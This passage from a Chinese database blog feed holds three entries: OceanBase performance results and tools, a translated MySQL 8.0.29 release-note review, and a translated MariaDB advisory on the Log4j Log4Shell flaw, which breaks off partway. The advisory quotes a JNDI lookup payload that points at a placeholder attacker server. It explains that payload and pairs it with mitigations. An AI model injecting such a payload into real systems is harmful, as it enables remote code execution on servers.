<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR          <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">--------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>LIMIT             <span class="operator">|</span>        <span class="operator">|</span><span class="number">100</span>      <span class="operator">|</span><span class="number">8933274</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> TOP<span class="operator">-</span>N SORT       <span class="operator">|</span>        <span class="operator">|</span><span class="number">100</span>      <span class="operator">|</span><span class="number">8933260</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  HASH <span class="keyword">JOIN</span>       <span class="operator">|</span>        <span class="operator">|</span><span class="number">3297</span>     <span class="operator">|</span><span class="number">8925142</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">3</span> <span class="operator">|</span>   HASH <span class="keyword">JOIN</span>      <span class="operator">|</span>        <span class="operator">|</span><span class="number">3330</span>     <span class="operator">|</span><span class="number">8609940</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">4</span> <span class="operator">|</span>    SUBPLAN SCAN  <span class="operator">|</span>VIEW1   <span class="operator">|</span><span class="number">3321</span>     <span class="operator">|</span><span class="number">5444449</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">5</span> <span class="operator">|</span>     HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">3321</span>     <span class="operator">|</span><span class="number">5443991</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">6</span> <span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">6001215</span>  <span class="operator">|</span><span class="number">2097020</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">7</span> <span class="operator">|</span>    SUBPLAN SCAN  <span class="operator">|</span>VIEW3   <span class="operator">|</span><span class="number">1500000</span>  <span class="operator">|</span><span class="number">2666737</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">8</span> <span class="operator">|</span>     HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">1500000</span>  <span class="operator">|</span><span class="number">2459704</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">9</span> <span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>orders  <span class="operator">|</span><span class="number">1500000</span>  <span class="operator">|</span><span class="number">552665</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">10</span><span class="operator">|</span>   SUBPLAN SCAN   <span class="operator">|</span>VIEW2   <span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">256232</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">11</span><span class="operator">|</span>    HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">|</span>        <span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">235529</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">12</span><span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN   <span class="operator">|</span>customer<span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">62265</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([VIEW2.customer.c_name], [VIEW2.customer.c_custkey], [VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [<span class="built_in">cast</span>(VIEW2.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW3.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW1.T_FUN_SUM(lineitem.l_quantity)]), <span class="keyword">filter</span>(nil), limit(<span class="number">100</span>), <span class="keyword">offset</span>(nil)</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([VIEW2.customer.c_name], [VIEW2.customer.c_custkey], [VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW3.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW1.T_FUN_SUM(lineitem.l_quantity)]), <span class="keyword">filter</span>(nil), sort_keys([VIEW3.orders.o_totalprice, <span class="keyword">DESC</span>], [VIEW3.orders.o_orderDATE, <span class="keyword">ASC</span>]), topn(<span class="number">100</span>)</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([VIEW2.customer.c_name], [VIEW2.customer.c_custkey], [VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW3.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW1.T_FUN_SUM(lineitem.l_quantity)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW2.customer.c_custkey <span class="operator">=</span> VIEW3.orders.o_custkey]), other_conds(nil)</span><br><span class="line">  <span class="number">3</span> <span class="operator">-</span> output([VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [VIEW3.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW1.T_FUN_SUM(lineitem.l_quantity)], [VIEW3.orders.o_custkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW3.orders.o_orderkey <span class="operator">=</span> VIEW1.l_orderkey]), other_conds(nil)</span><br><span class="line">  <span class="number">4</span> <span class="operator">-</span> output([VIEW1.l_orderkey], [VIEW1.T_FUN_SUM(lineitem.l_quantity)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW1.l_orderkey], [VIEW1.T_FUN_SUM(lineitem.l_quantity)])</span><br><span class="line">  <span class="number">5</span> <span class="operator">-</span> output([lineitem.l_orderkey], [T_FUN_SUM(lineitem.l_quantity)]), <span class="keyword">filter</span>([T_FUN_SUM(lineitem.l_quantity) <span class="operator">&gt;</span> ?]),</span><br><span class="line">      <span class="keyword">group</span>([lineitem.l_orderkey]), agg_func([T_FUN_SUM(lineitem.l_quantity)])</span><br><span class="line">  <span class="number">6</span> <span class="operator">-</span> output([lineitem.l_orderkey], [lineitem.l_quantity]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([lineitem.l_orderkey], [lineitem.l_quantity]), partitions(p0)</span><br><span class="line">  <span class="number">7</span> <span class="operator">-</span> output([VIEW3.orders.o_custkey], [VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [VIEW3.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW3.orders.o_custkey], [VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [VIEW3.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">8</span> <span class="operator">-</span> output([orders.o_custkey], [orders.o_orderkey], [orders.o_orderDATE], [orders.o_totalprice], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([orders.o_custkey], [orders.o_orderkey], [orders.o_orderDATE], [orders.o_totalprice]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">9</span> <span class="operator">-</span> output([orders.o_orderkey], [orders.o_custkey], [orders.o_orderDATE], [orders.o_totalprice]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([orders.o_orderkey], [orders.o_custkey], [orders.o_orderDATE], [orders.o_totalprice]), partitions(p0)</span><br><span class="line">  <span class="number">10</span> <span class="operator">-</span> output([VIEW2.customer.c_custkey], [VIEW2.customer.c_name], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW2.customer.c_custkey], [VIEW2.customer.c_name], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">11</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([customer.c_custkey], [customer.c_name]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">12</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([customer.c_custkey], [customer.c_name]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.022</span> sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="小结">小结</h2>
<p>将本次测试结果与前文测试结果合并，得到下表，从表中可知在当前测试环境下，是否设定表组的前后查询速度并没有太大波动，时间基本保持一致。</p>
<table>
<thead>
<tr>
<th>SQL</th>
<th>OceanBase</th>
<th>OB(合并后)</th>
<th>OB(Tablegroup)</th>
<th>MariaDB</th>
</tr>
</thead>
<tbody>
<tr>
<td>SQL-1</td>
<td>10.285 sec</td>
<td>9.108 sec</td>
<td>8.960 sec</td>
<td>13.61 sec</td>
</tr>
<tr>
<td>SQL-5</td>
<td>24.593 sec</td>
<td>4.477 sec</td>
<td>4.559 sec</td>
<td>23 min 52.91 sec</td>
</tr>
<tr>
<td>SQL-6</td>
<td>3.386 sec</td>
<td>2.557 sec</td>
<td>2.536 sec</td>
<td>2.69 sec</td>
</tr>
<tr>
<td>SQL-10</td>
<td>6.043 sec</td>
<td>3.727 sec</td>
<td>3.815 sec</td>
<td>43.29 sec</td>
</tr>
<tr>
<td>SQL-17</td>
<td>3.800 sec</td>
<td>2.901 sec</td>
<td>2.893 sec</td>
<td>6 min 25.23 sec</td>
</tr>
<tr>
<td>SQL-18</td>
<td>7.332 sec</td>
<td>6.016 sec</td>
<td>6.110 sec</td>
<td>1 min 43.55 sec</td>
</tr>
</tbody>
</table>
<p>再次验证上文所述，表组的设计目的是为了解决跨 zone 带来网络延迟问题。</p>
<h2 id="OceanBase-工具">OceanBase 工具</h2>
<p>在阅读 OceanBase 的代码时，发现源码中提供了两个工具，分别是 <code>env_checker.py</code> 和 <code>dooba.py</code>。</p>
<p>代码链接：<a class="link"   href="https://github.com/oceanbase/oceanbase/blob/master/tools/scripts/" >https://github.com/oceanbase/oceanbase/blob/master/tools/scripts/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li>env_checker.py</li>
</ul>
<p>该脚本用来检查操作系统的环境信息，基于python2编写，并需要安装依赖 <code>subprocess32</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./env_checker.py</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;./env_checker.py&quot;, line 15, in &lt;module&gt;</span><br><span class="line">    from subprocess32 import Popen, PIPE</span><br><span class="line">ImportError: No module named subprocess32</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pip install subprocess32 --user</span></span><br><span class="line">Collecting subprocess32</span><br><span class="line">  Downloading https://pypi.doubanio.com/packages/32/c8/564be4d12629b912ea431f1a50eb8b3b9d00f1a0b1ceff17f266be190007/subprocess32-3.5.4.tar.gz (97kB)</span><br><span class="line">    100% |################################| 102kB 1.3MB/s</span><br><span class="line">Installing collected packages: subprocess32</span><br><span class="line">  Running setup.py install for subprocess32 ... done</span><br><span class="line">Successfully installed subprocess32</span><br><span class="line">You are using pip version 8.1.2, however version 22.0.4 is available.</span><br><span class="line">You should consider upgrading via the &#x27;pip install --upgrade pip&#x27; command.</span><br></pre></td></tr></table></figure></div>
<p>执行示例如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./env_checker.py</span></span><br><span class="line">==================== os info ====================</span><br><span class="line">release: 3.10.0-1127.19.1.el7.x86_64</span><br><span class="line">sysname: Linux</span><br><span class="line">machine: x86_64</span><br><span class="line"></span><br><span class="line">==================== cpu info ===================</span><br><span class="line">count: 8 cores</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">==================== mem info ===================</span><br><span class="line">...</span><br><span class="line">memory_total: 15 GB</span><br><span class="line"></span><br><span class="line">==================== net info ===================</span><br><span class="line">lo</span><br><span class="line">  IPv4 address: 127.0.0.1</span><br><span class="line">  IPv6 address: ::1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">=================== disk info ===================</span><br><span class="line">device: /dev/mapper/centos-root</span><br><span class="line">mountpoint: /</span><br><span class="line">usage</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<ul>
<li><a class="link"   href="http://dooba.py" >dooba.py <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p><code>dooba</code> 是使用 Python 2 开发的监控 OB 的性能监控脚本，运行画面如下图。</p>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220429-508498c7-7382-4b57-90e9-924aabd36b1d.png"
                      referrerpolicy="no-referrer"
                >
<p>从画面中，可实时监控到OB运行状态，可以切换不同租户，查看某个租户的 QPS，和相应 SQL 的平均延时（RT），以及内存使用、IOPS 等情况。</p>
<h2 id="总结">总结</h2>
<p>OceanBase 数据库体系结构是复杂的，但设计的尽量简约，使人易于理解。<br>
上面的两个小工具只是点到为止，实战中可以使用 OCP 工具，现也已经开源。<br>
性能测试的话题涉猎面很广，本文也只是繁星一点，希望对本文读者和 OB 使用者有些许帮助或提示。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/399340" >https://www.modb.pro/db/399340 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>OceanBase</category>
        <category>OB v3</category>
      </categories>
      <tags>
        <tag>oceanbase</tag>
        <tag>mariadb</tag>
        <tag>oceanbase 社区版</tag>
        <tag>ob v3</tag>
        <tag>性能测试</tag>
        <tag>tablegroup</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 快速浏览 MySQL 8.0.29</title>
    <url>/2022/mysql/fanyi-quick-peek-at-mysql-8-0-29/</url>
    <content><![CDATA[<blockquote>
<p>原文地址：<a class="link"   href="https://www.percona.com/blog/quick-peek-at-mysql-8-0-29/" >https://www.percona.com/blog/quick-peek-at-mysql-8-0-29/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：David Stokes</p>
</blockquote>
<img  alt="MySQL8.0.29300x169.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220428-f28bc320-7465-4c0b-9cdf-43182da28b8d.png"
                      referrerpolicy="no-referrer"
                >
<p>4月26日，Oracle 发布了 MySQL Server 8.0.29，本文是对发布说明的快速回顾。我用斜体字标注了我自己的评论。</p>
<p>那么第29版的 MySQL Server 都发布了什么呢? 它是带有新的、整洁的功能，还是一个修复漏洞的大礼包？</p>
<h2 id="概述">概述</h2>
<p>虽然这个服务器版本有一些有趣的东西，但没有令人注目的特性需要立即升级。通读发布说明，看看其中是否有什么对你来说是必须的，但对我们大多数人来说，MySQL 8.0.29 不需要立即更新。<em>如果这是一个生日或节日礼物，第29个版本就相当于得到一盒新的牙线——有用但不令人兴奋。</em></p>
<p>shell 也在进化，VS Code 的新版本看起来也很有前途。</p>
<h2 id="MySQL-Server-8-0-29">MySQL Server 8.0.29</h2>
<h3 id="UTF8MB3">UTF8MB3?</h3>
<p>服务器现在对 <code>SHOW</code> 命令的输出大量使用 UTF8MB3 <em>(是3，不是4)</em>，当从内置字符集填充数据字典表时，会报告无效字符串。</p>
<h3 id="再见-DATETIME-TIMESTAMP-中的任意分隔符">再见 DATETIME/TIMESTAMP 中的任意分隔符</h3>
<p>现在，使用任何非标准或多余分隔符或空格字符都会触发警告。MySQL 允许你使用任意的分隔符，在 TIME, DATE, DATETIME 和 TIMESTAMP 文字中使用任意数量的分隔符，在 DATETIME 和 TIMESTAMP 文字的日期和时间值之前，之后和之间使用任意数量的空白符。 <em>那些平静的日子现在结束了。</em> 预计该功能将在未来的版本中被删除。</p>
<h3 id="已弃用的变量和选项">已弃用的变量和选项</h3>
<p><code>replica_parallel_type</code>, <code>query_prealloc_size</code>, 和 <code>transaction_prealloc_size</code> 变量已弃用， mysqld 的选项 <code>--abort-slave-event-count</code> 和 <code>--disconnect-slave-event-count</code> 也已弃用。</p>
<h3 id="PRIMARY-和-SECONDARY-引擎">PRIMARY 和 SECONDARY 引擎</h3>
<p><code>Performance Schema</code> 现在跟踪 PRIMARY 和 SECONDARY 引擎用于处理查询。通常，这将是 InnoDB 和 HeatWave。现在有一个 <code>EXECUTION_ENGINE</code> 列来记录哪个引擎使用 <code>COUNT_SECONDARY</code> 列完成了工作，从而知道该引擎被使用了多少次。</p>
<h3 id="SSL-库">SSL 库</h3>
<p>版本从 <code>1.1.1l</code> 升级到 <code>1.1.1.n</code>。</p>
<h3 id="IF-NOT-EXISTS">IF NOT EXISTS</h3>
<p>对函数、过程和触发器增加的 <code>IF NOT EXISTS</code> 检查。 <em>我们需要这个很久了。</em></p>
<h3 id="分离的-XA-事务">分离的 XA 事务</h3>
<p>组复制有一个问题，在另一个连接上准备的XA事务无法提交。现在可以由另一个连接提交或回滚准备好的XA事务。然后，当前会话还可以启动另一个XA或本地事务，而无需等待准备好的XA事务完成。</p>
<h3 id="经典和-X-协议锁文件">经典和 X 协议锁文件</h3>
<p>MySQL 经典或X协议的锁文件，文件格式不同，可以阻塞服务器启动。但现在他们使用相同的格式。</p>
<h3 id="即时删除表">即时删除表</h3>
<p><code>ALTER TABLE … DROP COLUMN  ALGORITHM=INSTANT</code> 现在可用了。</p>
<h3 id="安全持久化变量">安全持久化变量</h3>
<p>我们现在可以使用安全的持久化变量，而不是使用 keyring。您仍然需要 keyring 组件代替 keyring 插件来保存加密的信息。所以数据保存在操作系统的文件中，而不是在 keyring 中。</p>
<h3 id="克隆延迟">克隆延迟</h3>
<p>对于某些异步释放数据的操作系统来说，在删除旧数据后再克隆数据是有问题的。因此，新的 <code>clone_delay_after_data_drop</code> 变量允许您在克隆到达之前最都等待一个小时。 <em>太糟糕了，我们没有像优步那样的“你的克隆x分钟内到达”的状态更新。</em></p>
<h3 id="MyISAM">MyISAM</h3>
<p><code>myisam_repair_threads</code> 变量和 myisamchk 的 <code>--parallel-check</code> 选项被弃用。</p>
<h3 id="隔离的变量">隔离的变量</h3>
<p>用于解析、解决和执行 SQL 语句的更好代码，现在对访问系统变量采取了更加强制的隔离。</p>
<h3 id="错误修复">错误修复</h3>
<blockquote>
<p>原文：<br>
There are many bug fixes that take care of things from anonymous users with the PROCESS privilege could not select rows from the processlist table to histograms now storing buckets in dynamic arrays instead to reduce space overhead and will speed up selectivity estimation due to reduced indirection when performing a binary search on the buckets.</p>
</blockquote>
<p>有许多错误修复处理来自具有 PROCESS 权限的匿名用户无法从 processlist 表中选择行到直方图现在将存储桶存储在动态数组中，以减少空间开销，并且当对桶执行二分搜索时，减少间接性而加快选择性估算。</p>
<p>我建议通篇阅读新版本的每个错误修复，因为会发现“啊哈”时刻，当您发现某些在意识边缘影响到您的实例，或者因别人的问题而幸灾乐祸。</p>
<h2 id="MySQL-Shell">MySQL Shell</h2>
<p>MySQL Shell 有一个新的诊断工具，util.debug.collectDiagnostics，它从连接的 MySQL 服务器收集诊断信息。您可以在您选择的位置的 zip 归档文件中获得 TSV 和 YAML 格式的报告。这个工具能够使您获取诊断信息，包括，独立服务器、复制拓扑成员、MySQL 数据库服务中的数据库系统等。</p>
<p>并且在 shell 中，<code>prompt()</code> 函数提供了一个用来与用户交互的脚本。</p>
<blockquote>
<p>译者注：错误修复那段翻译的不是很优雅，请包涵，如果您有更好的翻译版本，欢迎留言。</p>
</blockquote>
<p>附：</p>
<ul>
<li><a class="link"   href="https://dev.mysql.com/doc/relnotes/mysql/8.0/en/news-8-0-29.html" >MySQL 8.0.29 Release Notes <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>译文</tag>
        <tag>mysql 8.0</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] MariaDB JDBC 驱动是否受 Log4j 脆弱性安全漏洞影响？</title>
    <url>/2022/mariadb/fanyi-is-the-mariadb-jdbc-driver-affected-by-the-log4j-vulnerability/</url>
    <content><![CDATA[<blockquote>
<p>原文地址：<a class="link"   href="https://mariadb.com/resources/blog/is-the-mariadb-jdbc-driver-affected-by-the-log4j-vulnerability/" >https://mariadb.com/resources/blog/is-the-mariadb-jdbc-driver-affected-by-the-log4j-vulnerability/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Alejandro Duarte</p>
</blockquote>
<p><a class="link"   href="https://mariadb.com/resources/blog/is-the-mariadb-jdbc-driver-affected-by-the-log4j-vulnerability/" >MariaDB Java 连接器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是否受 Log4j 最近发现的安全漏洞影响？默认情况下，Java 连接器不使用 Log4j。但是，如果您已经将其配置为使用 <a class="link"   href="https://mariadb.com/resources/blog/is-the-mariadb-jdbc-driver-affected-by-the-log4j-vulnerability/" >SLF4j <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，请继续阅读。</p>
<p>有关 MariaDB JDBC 驱动程序范围之外的信息，请阅读 <a class="link"   href="https://mariadb.com/resources/blog/is-the-mariadb-jdbc-driver-affected-by-the-log4j-vulnerability/" >Log4Shell 和 MariaDB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>注：本博客更新于2021-12-15，包括关于 <a class="link"   href="https://mariadb.com/resources/blog/is-the-mariadb-jdbc-driver-affected-by-the-log4j-vulnerability/" >CVE-2021-45046 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的细节。</p>
<h2 id="Log4j-脆弱性">Log4j 脆弱性</h2>
<p>Apache Log4j 是一个流行的用于Java应用程序的开源日志框架。它被用于各种开源和企业项目，包括云供应商和电子邮件服务提供商。2021年12月9日，在Log4j中发现了一个可以导致远程代码执行的0天漏洞，允许黑客在系统中执行任意代码。该漏洞被称为“Log4Shell”，被跟踪为 <a class="link"   href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228" >CVE-2021-44228 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>简而言之，该漏洞允许攻击者注入 JNDI 查找字符串，并且调用它，例如，远程 LDAP 服务器(被攻击者控制)，后者返回一个恶意的Java类:</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//[attacker_site]/[malicious_java_class]&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>如果 Log4j 记录了这样的字符串，恶意 Java 类就可以运行任意代码 (例如，通过静态代码块)。</p>
<h2 id="版本影响">版本影响</h2>
<p>幸运的是，只有 Log4j 2.x 版本，2.15.0之前版本受到影响。有关更多信息，请参阅 <a class="link"   href="https://logging.apache.org/log4j/2.x/security.html" >Apache Log4j 安全漏洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面。该漏洞在 Log4j 1.x 版本中不存在。</p>
<h2 id="如何减轻-CVE-2021-44228">如何减轻 CVE-2021-44228</h2>
<p>减轻该漏洞的最佳策略是更新项目中的 Log4j 依赖项。版本 2.16.0 中已经移除消息查找，并<a class="link"   href="https://lists.apache.org/thread/d6v4r6nosxysyq9rvnr779336yf0woz4" >已发布版本 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。感谢团队的快速发布。</p>
<p>更新：Log4j 2.16.0 还修复了跟踪的第二个漏洞 <a class="link"   href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046" >CVE-2021-45046 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>MariaDB JDBC 驱动程序没有使用Log4j 2.x。但是，它支持 SLF4J。检查你是否使用了绑定 Log4j 的 SLF4J。如果是，升级相应地 Log4j 或设置以下配置变量：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">-Dlog4j2.formatMsgNoLookups=true</span></span><br><span class="line"><span class="string">```</span>  </span><br><span class="line"></span><br><span class="line"><span class="string">或者，设定下面的环境变量：</span></span><br><span class="line"></span><br><span class="line"><span class="string">```yaml</span></span><br><span class="line"><span class="string">LOG4J_FORMAT_MSG_NO_LOOKUPS=true</span></span><br></pre></td></tr></table></figure></div>
<p><em>注意</em>：日志记录仅在由 <code>log</code> <a class="link"   href="https://mariadb.com/kb/en/about-mariadb-connector-j/#log-parameters" >参数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 显式设置时启用。除了 Log4j，你也可以选择其他的 SLF4J 绑定，比如 Jakarta Commons Logging， Logback，或者 Java Logging API。</p>
<p>如果你正在使用 Maven，你可以运行以下命令来确定你的项目是否依赖于 Log4j：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mvn dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core</span><br></pre></td></tr></table></figure></div>
<p>下面这个例子是你在一个脆弱项目中可能得到的输出：</p>
<img  alt="log4jvulnerabilityblogimg1.jpg.webp" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220424-bc989978-f214-4ea3-8cfb-8e2bda9d8e59.webp"
